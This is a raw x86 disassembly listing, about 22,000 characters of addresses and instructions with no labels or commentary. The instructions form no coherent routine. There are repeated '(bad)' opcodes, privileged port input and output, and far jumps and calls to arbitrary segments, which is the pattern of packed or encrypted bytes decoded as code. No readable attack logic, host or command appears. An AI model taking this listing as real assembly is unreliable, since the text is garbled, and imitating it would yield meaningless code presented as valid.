  40f3c7:	iret   
  40f3c8:	xchg   esi,eax
  40f3c9:	out    dx,eax
  40f3ca:	cmp    DWORD PTR [edi],eax
  40f3cc:	mov    al,ds:0x4211a822
  40f3d1:	test   bx,sp
  40f3d4:	inc    ecx
  40f3d5:	(bad)  
  40f3d6:	xchg   esi,eax
  40f3d7:	cmp    eax,DWORD PTR [edi-0x4d105730]
  40f3dd:	add    al,0xa0
  40f3df:	ror    DWORD PTR [ebx-0x41],cl
  40f3e2:	add    bl,bh
  40f3e4:	enter  0xe59c,0x9a
  40f3e8:	inc    ecx
  40f3e9:	and    al,0x2f
  40f3eb:	and    al,0x4b
  40f3ed:	sahf   
  40f3ee:	dec    edx
  40f3ef:	mov    dh,0xb4
  40f3f1:	inc    ebx
  40f3f2:	sbb    BYTE PTR [edx+0x6],0xc0
  40f3f6:	push   cs
  40f3f7:	popa   
  40f3f8:	in     al,0xa3
  40f3fa:	or     BYTE PTR [ebp-0x7b832c53],ch
  40f400:	sub    eax,0x5db4feed
  40f405:	jmp    0x40f3a8
  40f407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f408:	push   0xffffffde
  40f40a:	test   eax,esp
  40f40c:	(bad)  
  40f40d:	nop
  40f40e:	aad    0x1f
  40f410:	aad    0x79
  40f412:	or     dh,BYTE PTR [edi+0x29]
  40f415:	dec    esi
  40f416:	push   es
  40f417:	in     al,0x2c
  40f419:	retf   
  40f41a:	sub    BYTE PTR [edx+0x59a367e5],al
  40f420:	aaa    
  40f421:	sub    BYTE PTR [edi],bl
  40f423:	adc    bl,BYTE PTR [edi-0x5c]
  40f426:	sbb    BYTE PTR [edx-0x17],0x38
  40f42a:	xchg   ecx,eax
  40f42b:	mov    ds,WORD PTR [edi+ecx*4+0x2d04fe33]
  40f432:	and    bh,BYTE PTR [edi-0xb]
  40f435:	repz test al,0xa5
  40f438:	adc    eax,0xa926b300
  40f43d:	and    ch,BYTE PTR [edx]
  40f43f:	fisubr DWORD PTR [ebx]
  40f441:	adc    esp,DWORD PTR [ecx]
  40f443:	pop    esi
  40f444:	add    ebp,DWORD PTR [eiz*4+0x76602ff9]
  40f44b:	popa   
  40f44c:	out    0x1b,eax
  40f44e:	icebp  
  40f44f:	fwait
  40f450:	xchg   esi,eax
  40f451:	inc    dh
  40f453:	or     edx,DWORD PTR [ecx-0x3f]
  40f456:	ja     0x40f4a5
  40f458:	jae    0x40f3f9
  40f45a:	dec    ebx
  40f45b:	mov    ds,WORD PTR [edx+0x2b]
  40f45e:	jb     0x40f4c0
  40f460:	mov    eax,0x35082769
  40f465:	or     ebp,edx
  40f467:	lea    edi,[ebp+0x1dccb70]
  40f46d:	out    0xa1,al
  40f46f:	xlat   BYTE PTR ds:[ebx]
  40f470:	lock push 0xf8aff021
  40f476:	shl    DWORD PTR [edi],0x24
  40f479:	adc    DWORD PTR [ebp+ecx*4-0x79],0x31
  40f47e:	mov    al,ds:0x28479e43
  40f483:	ret    
  40f484:	add    al,0xdf
  40f486:	add    ebp,DWORD PTR ds:0x5dc3bb19
  40f48c:	add    ecx,DWORD PTR [ebx]
  40f48e:	and    al,0x96
  40f490:	jp     0x40f467
  40f492:	popf   
  40f493:	(bad)  
  40f494:	add    dh,BYTE PTR [ebp-0x6ef36d3b]
  40f49a:	sub    ah,BYTE PTR [ebx+0x49]
  40f49d:	int    0x0
  40f49f:	std    
  40f4a0:	jo     0x40f44e
  40f4a2:	mov    WORD PTR [esp+esi*4-0x43],ds
  40f4a6:	mov    bl,0xa6
  40f4a8:	imul   ecx,esp,0xffffffbd
  40f4ab:	or     BYTE PTR [ecx-0x6cf726e9],bl
  40f4b1:	int    0xc0
  40f4b3:	rcl    DWORD PTR [ebx-0x3edba91d],1
  40f4b9:	add    eax,0xd48c488d
  40f4be:	cmp    eax,ebx
  40f4c0:	mov    ebp,0x997adf76
  40f4c5:	sar    BYTE PTR [edx*4+0x4329e8],0xea
  40f4cd:	adc    BYTE PTR [esi+0x578c64cd],dh
  40f4d3:	push   ss
  40f4d4:	inc    eax
  40f4d5:	xor    ebp,DWORD PTR [ecx]
  40f4d7:	cwde   
  40f4d8:	inc    esi
  40f4d9:	jae    0x40f478
  40f4db:	sub    BYTE PTR [esi],ah
  40f4dd:	sub    al,0xa2
  40f4df:	push   ecx
  40f4e0:	sub    al,0xdd
  40f4e2:	dec    esi
  40f4e3:	mov    eax,ds:0x4697d90c
  40f4e8:	stos   DWORD PTR es:[edi],eax
  40f4e9:	out    0xa3,eax
  40f4eb:	js     0x40f566
  40f4ed:	pop    es
  40f4ee:	ret    
  40f4ef:	fld    TBYTE PTR [edx]
  40f4f1:	adc    BYTE PTR [esi+ebx*4],al
  40f4f4:	imul   esi,DWORD PTR [eax],0x7a
  40f4f7:	in     al,dx
  40f4f8:	mov    BYTE PTR [ecx+0x4],ah
  40f4fb:	pushf  
  40f4fc:	test   BYTE PTR [ecx],bh
  40f4fe:	sub    DWORD PTR [edx-0x9],0x23c96d52
  40f505:	out    0xd5,eax
  40f507:	sbb    eax,0x88dd1e66
  40f50c:	popf   
  40f50d:	or     dh,bl
  40f50f:	div    BYTE PTR [edx+ebx*8]
  40f512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f513:	mov    bh,0xdc
  40f515:	sub    al,0x9
  40f517:	pop    edi
  40f518:	adc    BYTE PTR [ecx-0x1d],0xb8
  40f51c:	cmp    esi,DWORD PTR [esi]
  40f51e:	fdiv   DWORD PTR [ecx+0x52efeff8]
  40f524:	pop    ebp
  40f525:	push   edi
  40f526:	xlat   BYTE PTR ds:[ebx]
  40f527:	pop    ebx
  40f528:	je     0x40f513
  40f52a:	jo     0x40f4b9
  40f52c:	pop    ebp
  40f52d:	cmc    
  40f52e:	scas   eax,DWORD PTR es:[edi]
  40f52f:	pop    esp
  40f530:	lods   eax,DWORD PTR ds:[esi]
  40f531:	dec    eax
  40f532:	inc    eax
  40f533:	xchg   ebx,eax
  40f534:	dec    ebx
  40f535:	add    ecx,ebx
  40f537:	xchg   esp,eax
  40f538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f539:	icebp  
  40f53a:	dec    edx
  40f53b:	xor    edx,0xf13e26b9
  40f541:	adc    eax,0xa60cae5c
  40f546:	arpl   WORD PTR [edi-0x6672d9a7],cx
  40f54c:	js     0x40f525
  40f54e:	std    
  40f54f:	dec    ebx
  40f550:	repnz cld 
  40f552:	cmp    BYTE PTR [esi],ah
  40f554:	cmp    bl,BYTE PTR [ecx]
  40f556:	ds call 0xa2ed:0x59bda12c
  40f55e:	mov    ch,0xd
  40f560:	imul   ebx,eax,0x92ef0b25
  40f566:	aaa    
  40f567:	add    ch,BYTE PTR [edi+edi*4+0x64c8155b]
  40f56e:	paddusw mm4,QWORD PTR ds:0xe86bd694
  40f575:	test   eax,0x21759ada
  40f57a:	popf   
  40f57b:	(bad)  
  40f57c:	pop    ecx
  40f57d:	dec    edx
  40f57e:	xor    BYTE PTR [ecx+0x2752b271],ah
  40f584:	ins    BYTE PTR es:[edi],dx
  40f585:	adc    BYTE PTR ds:0x54405baf,0xa3
  40f58c:	push   ebx
  40f58d:	fbld   TBYTE PTR [ebx-0xf]
  40f590:	jbe    0x40f545
  40f592:	ds jp  0x40f526
  40f595:	mov    DWORD PTR [eax],ecx
  40f597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f598:	push   es
  40f599:	jge    0x40f57e
  40f59b:	inc    ebx
  40f59c:	sub    ah,0x6f
  40f59f:	xor    dl,BYTE PTR [ebx-0x75]
  40f5a2:	aas    
  40f5a3:	add    al,0x9b
  40f5a5:	jno    0x40f530
  40f5a7:	pop    ebx
  40f5a8:	jo     0x40f5ad
  40f5aa:	pop    esi
  40f5ab:	sub    al,0x91
  40f5ad:	xchg   edi,eax
  40f5ae:	cmp    edx,DWORD PTR [esi-0x6f]
  40f5b1:	ins    DWORD PTR es:[edi],dx
  40f5b2:	jecxz  0x40f5e9
  40f5b4:	cmp    bh,dh
  40f5b6:	or     eax,0xbb6d6641
  40f5bb:	ss inc ebp
  40f5bd:	mov    esp,0x2cb6316a
  40f5c2:	ror    dl,cl
  40f5c4:	mov    ds:0xb65d00f7,al
  40f5c9:	retf   0x97d9
  40f5cc:	xchg   DWORD PTR [eax-0x48ea0944],eax
  40f5d2:	lock lds edx,FWORD PTR [ebx-0x23]
  40f5d6:	fcomi  st,st(4)
  40f5d8:	mov    bh,0xc
  40f5da:	push   ax
  40f5dc:	cmp    cl,bl
  40f5de:	shl    BYTE PTR [eax],0x25
  40f5e1:	imul   edi,edx,0x22
  40f5e4:	xchg   esi,eax
  40f5e5:	and    DWORD PTR ds:0x700f14ef,ebp
  40f5eb:	xchg   DWORD PTR [edi],esi
  40f5ed:	push   eax
  40f5ee:	sahf   
  40f5ef:	ss jmp 0x40f60c
  40f5f2:	(bad)  [edx+0x16]
  40f5f5:	rcl    DWORD PTR [ebx],0xa0
  40f5f8:	jecxz  0x40f5f0
  40f5fa:	call   0x1700d4ed
  40f5ff:	jle    0x40f590
  40f601:	mov    ds:0xb7e82806,al
  40f606:	push   ebp
  40f607:	lods   al,BYTE PTR ds:[esi]
  40f608:	and    eax,0xfb79f507
  40f60d:	cmc    
  40f60e:	rol    al,0xf3
  40f611:	mov    esi,0x3e0a78fb
  40f616:	pop    ebx
  40f617:	cmp    al,0x29
  40f619:	cmc    
  40f61a:	lods   eax,DWORD PTR ds:[esi]
  40f61b:	push   ebp
  40f61c:	call   0xb6b2:0x318dad3c
  40f623:	stos   DWORD PTR es:[edi],eax
  40f624:	mov    bl,0xbf
  40f626:	lea    esp,[ecx]
  40f628:	or     edx,DWORD PTR [ecx+0x66]
  40f62b:	mov    bh,0x24
  40f62d:	inc    ebp
  40f62e:	adc    eax,0x8d1ff3f8
  40f633:	or     DWORD PTR [ecx+0x1a555015],edi
  40f639:	cdq    
  40f63a:	and    al,0x78
  40f63c:	or     BYTE PTR [eax-0x5b],dh
  40f63f:	and    DWORD PTR [esp+eax*8-0xd],ebp
  40f643:	mov    eax,0x3b1278e0
  40f648:	ins    DWORD PTR es:[edi],dx
  40f649:	popf   
  40f64a:	ja     0x40f5e1
  40f64c:	pop    edi
  40f64e:	xchg   ebx,eax
  40f64f:	mov    ebx,0x2f28f4d6
  40f654:	std    
  40f655:	test   BYTE PTR cs:[ebp+0x51],ah
  40f659:	jae    0x40f61e
  40f65b:	pop    eax
  40f65c:	(bad)  [edx+0x68efd771]
  40f662:	dec    ebx
  40f663:	cmp    edx,ebx
  40f665:	adc    DWORD PTR [ebx-0x1b],eax
  40f668:	xor    bl,dh
  40f66a:	rcr    edi,0x89
  40f66d:	popa   
  40f66e:	cmc    
  40f66f:	jno    0x40f6a6
  40f671:	fiadd  WORD PTR [esi-0x51]
  40f674:	mov    al,ds:0xcb186a22
  40f679:	dec    esi
  40f67a:	or     bl,BYTE PTR [esi+edi*4-0x7aad1e8a]
  40f681:	mov    esi,0x75a43d9b
  40f686:	xchg   edx,eax
  40f687:	xor    ecx,DWORD PTR [ebx+0x59]
  40f68a:	jbe    0x40f6a3
  40f68c:	mov    ebp,0x4f0635c7
  40f691:	add    ah,BYTE PTR [ecx+edi*4]
  40f694:	or     DWORD PTR [edi-0x45],0x77
  40f698:	call   0x74ab59c2
  40f69d:	xchg   ebx,eax
  40f69e:	mov    al,ds:0xb56528e7
  40f6a3:	dec    ebx
  40f6a4:	pop    esp
  40f6a5:	inc    edx
  40f6a6:	out    0x8,al
  40f6a8:	fisttp WORD PTR ds:0x69a520a2
  40f6ae:	add    BYTE PTR [esi+0x47],al
  40f6b1:	mov    eax,ds:0x414124b0
  40f6b6:	pusha  
  40f6b7:	cs mov dl,0x82
  40f6ba:	out    0x4d,al
  40f6bc:	fwait
  40f6bd:	cld    
  40f6be:	jle    0x40f703
  40f6c0:	adc    BYTE PTR [edx-0x2d],ch
  40f6c3:	(bad)  
  40f6c4:	cwde   
  40f6c5:	dec    edi
  40f6c6:	sbb    BYTE PTR [edi-0x3d],cl
  40f6c9:	enter  0x4f05,0x9c
  40f6cd:	mov    al,0xc8
  40f6cf:	xchg   esi,eax
  40f6d0:	xchg   esi,eax
  40f6d1:	ss (bad) 
  40f6d3:	sbb    edx,0x7f
  40f6d6:	sbb    ch,bl
  40f6d8:	test   DWORD PTR [esi-0x4e],eax
  40f6db:	pop    ds
  40f6dc:	pushf  
  40f6dd:	push   0x4e
  40f6df:	mov    BYTE PTR [eax+0xb5ec8],bh
  40f6e5:	or     BYTE PTR [ecx+ebx*8-0x64],bh
  40f6e9:	jmp    0x72fe:0x6de6344c
  40f6f0:	and    cl,BYTE PTR [edi]
  40f6f2:	in     al,dx
  40f6f3:	iret   
  40f6f4:	in     al,0x97
  40f6f6:	dec    edi
  40f6f7:	push   esp
  40f6f8:	dec    edx
  40f6f9:	hlt    
  40f6fa:	std    
  40f6fb:	mov    al,ds:0x8944ef5
  40f700:	shl    BYTE PTR [esi-0x2dc4f6b1],cl
  40f706:	stc    
  40f707:	xchg   edi,eax
  40f708:	sbb    edi,0x16b203c4
  40f70e:	test   BYTE PTR [ebp-0x59c19104],ch
  40f714:	stc    
  40f715:	push   ebp
  40f716:	jno    0x40f723
  40f718:	mov    eax,0x466c569d
  40f71d:	sahf   
  40f71e:	mov    ecx,0x67e27f08
  40f723:	or     dl,BYTE PTR [edx+eiz*4+0x3a]
  40f727:	arpl   WORD PTR fs:[ecx+0x1e],bp
  40f72b:	pop    edi
  40f72c:	stos   BYTE PTR es:[edi],al
  40f72d:	sti    
  40f72e:	aas    
  40f72f:	inc    esi
  40f730:	jecxz  0x40f75e
  40f732:	retf   0xc2dc
  40f735:	dec    eax
  40f736:	in     eax,dx
  40f737:	jp     0x40f6db
  40f739:	fidivr WORD PTR [ebx+0x3e]
  40f73c:	inc    ecx
  40f73d:	ins    DWORD PTR es:[edi],dx
  40f73e:	inc    esi
  40f73f:	sub    edi,DWORD PTR ds:0xd9532416
  40f745:	jns    0x40f6f5
  40f747:	test   DWORD PTR [ebp+eax*2+0x70],ebx
  40f74b:	inc    esp
  40f74c:	pop    eax
  40f74d:	jnp    0x40f6ef
  40f74f:	daa    
  40f750:	rol    BYTE PTR [esi+0x487fa23d],cl
  40f756:	addr16 lock in al,0x6f
  40f75a:	out    dx,eax
  40f75b:	fucomi st,st(1)
  40f75d:	mov    cl,BYTE PTR [edi+0x71]
  40f760:	xchg   ch,cl
  40f762:	and    eax,0x7faca72c
  40f767:	aas    
  40f768:	in     al,dx
  40f769:	mov    DWORD PTR [esi+0x54],edi
  40f76c:	in     eax,dx
  40f76d:	adc    ecx,DWORD PTR [eax]
  40f76f:	add    bh,BYTE PTR [ecx]
  40f771:	adc    ebp,ebp
  40f773:	mov    BYTE PTR [ecx+0x5f13dde9],al
  40f779:	mov    ch,0xd8
  40f77b:	dec    edx
  40f77c:	jae    0x40f7a1
  40f77e:	mov    ebp,0x31ae5bd8
  40f783:	das    
  40f784:	push   ss
  40f785:	mov    eax,ds:0xa66c86b
  40f78a:	jecxz  0x40f7de
  40f78c:	mov    al,ds:0x5840321
  40f791:	gs (bad) 
  40f793:	mov    al,ds:0xa52b75e0
  40f798:	dec    ebx
  40f799:	pop    eax
  40f79a:	pusha  
  40f79b:	push   ss
  40f79c:	dec    edx
  40f79d:	loope  0x40f80c
  40f79f:	outs   dx,BYTE PTR ds:[esi]
  40f7a0:	ins    BYTE PTR es:[edi],dx
  40f7a1:	xchg   DWORD PTR [esi-0x5c],edx
  40f7a4:	and    eax,0x8d9f5bcc
  40f7a9:	loopne 0x40f7f3
  40f7ab:	xchg   edi,eax
  40f7ac:	scas   eax,DWORD PTR es:[edi]
  40f7ad:	push   edi
  40f7ae:	adc    BYTE PTR [ecx],al
  40f7b0:	scas   al,BYTE PTR es:[edi]
  40f7b1:	adc    DWORD PTR [ecx],ecx
  40f7b3:	sti    
  40f7b4:	push   ds
  40f7b5:	data16 sbb cl,BYTE PTR [ebp-0x58]
  40f7b9:	mov    dh,0xc5
  40f7bb:	jb     0x40f79d
  40f7bd:	pushf  
  40f7be:	mov    dh,0xf0
  40f7c0:	mov    cl,0x45
  40f7c2:	mov    al,0xb3
  40f7c4:	push   esi
  40f7c5:	jmp    0x116414d6
  40f7ca:	fsubp  st(2),st
  40f7cc:	adc    al,0x81
  40f7ce:	sub    BYTE PTR [ecx+0x63],dh
  40f7d1:	in     eax,0x68
  40f7d3:	xor    BYTE PTR cs:[ebp+0x1afb4b40],al
  40f7da:	cmp    eax,0x288b62cf
  40f7df:	mov    cl,0x2b
  40f7e1:	sub    ebp,DWORD PTR [eax+0x4]
  40f7e4:	iret   
  40f7e5:	push   edx
  40f7e6:	es mov eax,0xb18ccec8
  40f7ec:	sbb    BYTE PTR [ebx],0x76
  40f7ef:	mov    bl,0xb7
  40f7f1:	outs   dx,DWORD PTR ds:[esi]
  40f7f2:	inc    edi
  40f7f3:	sbb    al,0xd5
  40f7f5:	je     0x40f7c7
  40f7f7:	add    ch,BYTE PTR [ecx+0x7d0d82a7]
  40f7fd:	fwait
  40f7fe:	sti    
  40f7ff:	aad    0xef
  40f801:	pop    eax
  40f802:	adc    BYTE PTR [edi+esi*2-0x7e],0x5c
  40f807:	or     DWORD PTR [ecx+0x78],ebx
  40f80a:	sub    ebx,DWORD PTR [edi-0x671aa8f0]
  40f810:	test   BYTE PTR [eax-0x80],bl
  40f813:	cmp    al,0x4d
  40f815:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f816:	jmp    0xc5ec:0x3e3a592e
  40f81d:	xchg   edi,eax
  40f81e:	jg     0x40f7b3
  40f820:	(bad)  
  40f821:	ds (bad) 
  40f824:	push   ds
  40f825:	ret    0xf58e
  40f828:	pop    es
  40f829:	jge    0x40f845
  40f82b:	adc    eax,0x51714762
  40f830:	(bad)  
  40f831:	cmp    edi,DWORD PTR [ebx-0x53]
  40f834:	mov    al,ds:0xfaed966c
  40f839:	push   eax
  40f83a:	das    
  40f83b:	mov    al,ds:0x22dd2499
  40f840:	push   es
  40f841:	ins    DWORD PTR es:[edi],dx
  40f842:	and    ebx,DWORD PTR [eax-0x4cccbd3d]
  40f848:	scas   al,BYTE PTR es:[edi]
  40f849:	jle    0x40f881
  40f84b:	outs   dx,BYTE PTR ds:[esi]
  40f84c:	add    BYTE PTR [ebp+0x6f27da68],0x4e
  40f853:	add    bh,BYTE PTR [edi]
  40f855:	test   DWORD PTR [eax],edx
  40f857:	jle    0x40f88a
  40f859:	mov    ds:0x24a3215,eax
  40f85e:	je     0x40f864
  40f860:	mov    al,BYTE PTR [ebx]
  40f862:	adc    edi,DWORD PTR [esi+0x5c604cbf]
  40f868:	clc    
  40f869:	int    0x2d
  40f86b:	sbb    dh,BYTE PTR [edi+0x7984dd1d]
  40f871:	pop    ebp
  40f872:	(bad)  
  40f874:	and    al,0x5b
  40f876:	xor    ebp,esp
  40f878:	retf   
  40f879:	sub    al,0xc1
  40f87b:	add    ch,ch
  40f87d:	sbb    dl,BYTE PTR [edx-0xdeb4af7]
  40f883:	xchg   DWORD PTR [ebx],ebx
  40f885:	dec    eax
  40f886:	mov    bl,0xe3
  40f888:	fld    QWORD PTR ds:0x220f79bb
  40f88e:	push   ss
  40f88f:	int3   
  40f890:	jmp    0xd04a699f
  40f895:	fwait
  40f896:	add    al,0x99
  40f898:	into   
  40f899:	dec    edi
  40f89a:	out    dx,al
  40f89b:	add    al,0xd
  40f89d:	sahf   
  40f89e:	xchg   ebp,eax
  40f89f:	int3   
  40f8a0:	xchg   edx,eax
  40f8a1:	gs nop
  40f8a3:	add    al,0xc
  40f8a5:	cmp    edx,DWORD PTR [ebx+0x3ca12371]
  40f8ab:	gs xor al,0x96
  40f8ae:	int3   
  40f8af:	xor    ecx,DWORD PTR [edx-0x33267887]
  40f8b5:	and    eax,0x4d79bc0d
  40f8ba:	mov    esi,0x4185a41b
  40f8bf:	mov    eax,0xf83eeb71
  40f8c4:	xor    bl,BYTE PTR [edi]
  40f8c6:	popa   
  40f8c7:	xchg   edx,eax
  40f8c8:	mov    esp,DWORD PTR [ebx]
  40f8ca:	ins    BYTE PTR es:[edi],dx
  40f8cb:	push   edi
  40f8cc:	loopne 0x40f877
  40f8ce:	jne    0x40f896
  40f8d0:	pop    ecx
  40f8d1:	out    0x77,eax
  40f8d3:	xchg   edi,eax
  40f8d4:	pop    esp
  40f8d5:	mov    DWORD PTR [eax],esi
  40f8d7:	sbb    eax,0x42c9be48
  40f8dc:	xor    BYTE PTR [edx],0xc
  40f8df:	arpl   WORD PTR [edi+edx*1+0x2c],bx
  40f8e3:	pop    ss
  40f8e4:	xchg   esp,esp
  40f8e6:	fdivr  st(0),st
  40f8e8:	jl     0x40f8b3
  40f8ea:	je     0x40f89b
  40f8ec:	add    eax,0xbfd2bee3
  40f8f1:	and    eax,DWORD PTR [eax-0x1563da1]
  40f8f7:	push   0xc95ec2ca
  40f8fc:	cmp    al,0xde
  40f8fe:	push   ebp
  40f8ff:	imul   ebp,DWORD PTR [eax+0x45784b63],0xb25079cd
  40f909:	push   esi
  40f90a:	and    ch,cl
  40f90c:	fidiv  DWORD PTR [eax+0x76695404]
  40f912:	aam    0xbe
  40f914:	mov    esi,0xe1a644ca
  40f919:	push   ss
  40f91a:	cli    
  40f91b:	(bad)  
  40f91c:	pop    ds
  40f91d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f91e:	push   ecx
  40f91f:	enter  0xa0d8,0x7
  40f923:	cmc    
  40f924:	gs mov esi,esi
  40f927:	cli    
  40f928:	mov    esp,0xb72130fb
  40f92d:	xchg   edx,eax
  40f92e:	mov    edi,DWORD PTR [esi-0x7a]
  40f931:	mov    esi,0x3a2215b8
  40f936:	out    dx,al
  40f937:	pop    ebx
  40f938:	(bad)  
  40f939:	xacquire xchg BYTE PTR [edi-0x758f7246],bl
  40f940:	fs dec esi
  40f942:	mov    esp,0x77d2a4fe
  40f947:	inc    esi
  40f948:	adc    dh,BYTE PTR [edx]
  40f94a:	out    dx,eax
  40f94b:	out    dx,eax
  40f94c:	mov    eax,esi
  40f94e:	push   edi
  40f94f:	in     eax,dx
  40f950:	test   BYTE PTR [edx+0x6bafc8ce],ah
  40f956:	cwde   
  40f957:	push   esp
  40f958:	inc    edx
  40f959:	push   eax
  40f95a:	push   ebp
  40f95b:	mov    edx,0x211fe95f
  40f960:	test   eax,0xb919cdef
  40f965:	cli    
  40f966:	popf   
  40f967:	fistp  WORD PTR [esi]
  40f969:	xchg   edx,eax
  40f96a:	inc    ebp
  40f96b:	jle    0x40f96b
  40f96d:	jle    0x40f9d6
  40f96f:	aam    0xe3
  40f971:	mov    al,0x11
  40f973:	inc    esp
  40f974:	cmp    bl,0xff
  40f977:	xlat   BYTE PTR ds:[ebx]
  40f978:	push   cs
  40f979:	vmread DWORD PTR [esi-0x67],ebp
  40f97d:	push   ss
  40f97e:	jne    0x40f90a
  40f980:	mov    DWORD PTR [edi+0x2444231e],esp
  40f986:	xchg   BYTE PTR [edi+0x52],cl
  40f989:	in     eax,dx
  40f98a:	mov    ebp,0xcb387ce4
  40f98f:	in     eax,0x83
  40f991:	int    0xdd
  40f993:	in     al,0x20
  40f995:	sbb    eax,0x485213a3
  40f99a:	call   0xc7b:0x69dd3c76
  40f9a1:	(bad)  
  40f9a3:	sbb    eax,0xa6f85fc3
  40f9a8:	je     0x40fa06
  40f9aa:	xlat   BYTE PTR ds:[ebx]
  40f9ab:	jmp    0x40fa14
  40f9ad:	loope  0x40f98e
  40f9af:	aad    0xb8
  40f9b1:	pop    es
  40f9b2:	xor    DWORD PTR [ebx-0x4c3cd2f6],ecx
  40f9b8:	cmc    
  40f9b9:	jge    0x40fa35
  40f9bb:	arpl   WORD PTR fs:[ecx+0x792bf520],di
  40f9c2:	push   cs
  40f9c3:	gs pop es
  40f9c5:	mov    cs,WORD PTR [ebp-0x7c5acdd4]
  40f9cb:	ss int 0xb3
  40f9ce:	aas    
  40f9cf:	push   ds
  40f9d0:	mov    esp,0x11f84b83
  40f9d5:	fdivrp st(2),st
  40f9d7:	retf   
  40f9d8:	je     0x40f967
  40f9da:	push   ss
  40f9db:	test   dh,dl
  40f9dd:	mov    bl,0xe2
  40f9df:	fimul  DWORD PTR [ebx+0x33962233]
  40f9e5:	in     eax,dx
  40f9e6:	shr    ebx,cl
  40f9e8:	les    edi,FWORD PTR ds:0xc74c25f4
  40f9ee:	fs faddp st(1),st
  40f9f1:	mov    dl,0xbe
  40f9f3:	sub    eax,0x7684094
  40f9f8:	mov    ebp,0x5e0b2305
  40f9fd:	addr16 loopne 0x40f9d9
  40fa00:	mov    ah,0xcd
  40fa02:	push   eax
  40fa03:	loope  0x40f9bd
  40fa05:	(bad)  
  40fa06:	fbld   TBYTE PTR [ebx]
  40fa08:	xchg   ebx,eax
  40fa09:	sbb    ah,BYTE PTR [edi]
  40fa0b:	dec    esi
  40fa0c:	and    al,0x32
  40fa0e:	stos   DWORD PTR es:[edi],eax
  40fa0f:	xchg   esi,eax
  40fa10:	inc    esi
  40fa11:	dec    esp
  40fa12:	add    esi,DWORD PTR [edi-0x1e]
  40fa15:	mov    edi,0xaadf834
  40fa1a:	es in  al,dx
  40fa1c:	and    DWORD PTR [eax+0x6c31883c],eax
  40fa22:	push   ebp
  40fa23:	xchg   BYTE PTR [eax],bh
  40fa25:	retf   0xbe9e
  40fa28:	add    ax,0xf053
  40fa2c:	sahf   
  40fa2d:	mov    ds:0xd1a36cf9,al
  40fa32:	mov    cl,0x9
  40fa34:	xor    al,0x2f
  40fa36:	outs   dx,BYTE PTR ds:[esi]
  40fa37:	fwait
  40fa38:	xor    bh,bh
  40fa3a:	cwde   
  40fa3b:	scas   al,BYTE PTR es:[edi]
  40fa3c:	sahf   
  40fa3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa3e:	hlt    
  40fa3f:	shr    DWORD PTR [ecx+ebp*2-0x4115859a],0x76
  40fa47:	inc    esp
  40fa48:	sbb    al,0x45
  40fa4a:	daa    
  40fa4b:	mov    esp,0x70400cfc
  40fa50:	adc    al,0x88
  40fa52:	icebp  
  40fa53:	iret   
  40fa54:	ja     0x40fa45
  40fa56:	xor    bl,BYTE PTR [edi+0x13d85d59]
  40fa5c:	push   edx
  40fa5d:	loop   0x40f9f2
  40fa5f:	icebp  
  40fa60:	xlat   BYTE PTR ds:[ebx]
  40fa61:	loop   0x40fa17
  40fa63:	test   eax,0x1d67255e
  40fa68:	scas   eax,DWORD PTR es:[edi]
  40fa69:	xchg   ecx,eax
  40fa6a:	aam    0xfb
  40fa6c:	int    0x7b
  40fa6e:	sbb    cl,cl
  40fa70:	sti    
  40fa71:	cmp    dh,BYTE PTR [esi]
  40fa73:	call   FWORD PTR [ecx-0x6a]
  40fa76:	in     al,0x3b
  40fa78:	sar    BYTE PTR [ebx-0x15],1
  40fa7b:	sub    cl,dl
  40fa7d:	add    dh,dl
  40fa7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa80:	sbb    dh,BYTE PTR [eax+0xc7b2be]
  40fa86:	sbb    DWORD PTR [ecx+0x4ad12d4d],esi
  40fa8c:	fcom   DWORD PTR [ecx+0x49724b32]
  40fa92:	data16 cli 
  40fa94:	jle    0x40fab5
  40fa96:	adc    al,0x2
  40fa98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa99:	dec    esp
  40fa9a:	mov    al,0xb
  40fa9c:	gs inc ecx
  40fa9e:	aaa    
  40fa9f:	mov    esi,0xdebd7bae
  40faa4:	mov    cl,0xe
  40faa6:	int    0x96
  40faa8:	push   0xc
  40faaa:	xchg   ebx,eax
  40faab:	iret   
  40faac:	popa   
  40faad:	hlt    
  40faae:	mov    bl,0xee
  40fab0:	xchg   bh,ah
  40fab2:	inc    esp
  40fab3:	retf   
  40fab4:	push   ebp
  40fab5:	adc    dh,BYTE PTR [ebp+0x51]
  40fab8:	ret    0x207
  40fabb:	inc    eax
  40fabc:	xchg   edx,eax
  40fabd:	pop    esp
  40fabe:	inc    edx
  40fabf:	mov    al,ds:0xa6a222f9
  40fac4:	push   esi
  40fac5:	in     eax,dx
  40fac6:	cmp    al,0x37
  40fac8:	retf   
  40fac9:	adc    bh,BYTE PTR [esi]
  40facb:	mov    DWORD PTR [esi+0x20a53aa4],edx
  40fad1:	mov    bh,0xe
  40fad3:	retf   0x88cb
  40fad6:	xchg   ecx,eax
  40fad7:	lea    edi,[eax+0x8efa0c1]
  40fadd:	sbb    cl,BYTE PTR [esi+0x48c07a39]
  40fae3:	pop    ds
  40fae4:	imul   esi,DWORD PTR [edi+0x2bf99ea2],0xad48120b
  40faee:	fwait
  40faef:	add    dh,0x96
  40faf2:	xor    eax,0x5a56a9fa
  40faf7:	mov    edi,0x5c9ad59e
  40fafc:	push   0xffffff80
  40fafe:	mov    dh,0x5b
  40fb00:	dec    esi
  40fb01:	fisubr WORD PTR [ecx-0x4]
  40fb04:	icebp  
  40fb05:	adc    DWORD PTR [ebp-0x4cb345bc],0xffffffc7
  40fb0c:	push   es
  40fb0d:	add    esi,DWORD PTR [edi+ecx*2]
  40fb10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb11:	cwde   
  40fb12:	mov    edx,ecx
  40fb14:	repnz push edx
  40fb16:	push   edi
  40fb17:	jns    0x40faf6
  40fb19:	psllq  mm5,mm1
  40fb1c:	cmp    ebp,DWORD PTR [ebp-0x6b8674cc]
  40fb22:	loop   0x40fac5
  40fb24:	add    al,0x68
  40fb26:	push   ds
  40fb27:	out    dx,eax
  40fb28:	or     DWORD PTR [esi+0x64],edx
  40fb2b:	test   al,0xa9
